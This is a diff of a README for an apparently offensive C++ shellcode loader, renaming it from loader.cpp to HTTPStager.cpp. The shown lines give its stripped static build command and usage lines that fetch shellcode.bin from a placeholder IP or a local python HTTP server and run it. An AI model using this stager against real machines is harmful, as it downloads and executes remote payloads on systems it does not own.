@@ -12,7 +12,7 @@ This tool demonstrates:
 
 ## 📂 Filename
 
-**loader.cpp** – Console-based shellcode loader (C++)
+**HTTPStager.cpp** – Console-based shellcode loader (C++)
 
 ## 📌 Technique
 
@@ -30,13 +30,13 @@ This tool demonstrates:
 ## ⚙️ Build
 
 ```bash
-x86_64-w64-mingw32-g++ loader.cpp -o loader.exe -static -lwininet -s -Wl,-subsystem,console
+x86_64-w64-mingw32-g++ HTTPStager.cpp -o HTTPStager.exe -static -lwininet -s -Wl,-subsystem,console
 ```
 
 ## 🧪 Usage
 
 ```bash
-loader.exe http://<ip_address>/shellcode.bin
+HTTPStager.exe http://<ip_address>/shellcode.bin
 ```
 
 ## 🛠️ Example Shellcode Generation
@@ -53,5 +53,5 @@ python3 -m http.server 80
 
 Then run
 ```bash
-loader.exe http://127.0.0.1/shellcode.bin
+HTTPStager.exe http://127.0.0.1/shellcode.bin
 ```
